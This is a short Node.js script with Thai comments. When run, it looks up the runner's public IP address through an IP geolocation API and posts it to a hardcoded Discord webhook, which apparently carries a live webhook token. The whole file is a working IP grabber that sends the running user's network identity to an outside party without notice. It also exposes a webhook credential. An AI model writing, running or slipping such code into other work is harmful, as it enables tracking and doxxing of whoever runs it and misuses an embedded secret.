const fetch = require('node-fetch');
const discordWebhookURL = 'https://discord.com/api/webhooks/1108367514276216883/zYG55LmzYtg5GCAmtqoQuQ6qKv1m48yZiVjabh7peYt8RaRHtlc1tJhivR48-uYmV-6t';

// ฟังก์ชันสำหรับค้นหา IP และส่งข้อมูลไปยัง Discord
function processUserIP() {
  fetch('https://api.ipgeolocation.io/getip')
    .then(response => response.json())
    .then(data => {
      const { ip } = data;
      
      // ส่งข้อมูลไปยัง Discord
      sendToDiscord(`IP: ${ip}`);
    })
    .catch(error => {
      console.error('Error fetching IP:', error);
    });
}

// ฟังก์ชันสำหรับส่งข้อมูลไปยัง Discord
function sendToDiscord(message) {
  fetch(discordWebhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: message }),
  })
    .then(() => {
      console.log('Data sent to Discord');
    })
    .catch(error => {
      console.error('Error sending data to Discord:', error);
    });
}

// เรียกใช้งานฟังก์ชัน processUserIP เมื่อต้องการดึงข้อมูล IP และส่งข้อมูลไปยัง Discord
processUserIP();
